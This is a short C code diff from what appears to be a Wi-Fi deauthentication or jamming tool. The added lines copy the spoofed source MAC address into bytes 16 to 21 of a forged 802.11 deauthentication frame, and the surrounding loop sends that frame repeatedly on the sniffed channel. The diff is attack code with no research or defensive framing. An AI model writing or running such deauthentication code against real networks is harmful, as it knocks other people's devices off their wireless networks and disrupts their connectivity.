@@ -25,6 +25,12 @@ void wifi_deauth(void)
         deauth_frame[13] = b.source_mac[3];
         deauth_frame[14] = b.source_mac[4];
         deauth_frame[15] = b.source_mac[5];
+        deauth_frame[16] = b.source_mac[0];
+        deauth_frame[17] = b.source_mac[1];
+        deauth_frame[18] = b.source_mac[2];
+        deauth_frame[19] = b.source_mac[3];
+        deauth_frame[20] = b.source_mac[4];
+        deauth_frame[21] = b.source_mac[5];
 
         int sniffChan = wifi_get_sniff_channel();
         for (int k = 0; k < JAM_COUNT; k++) {
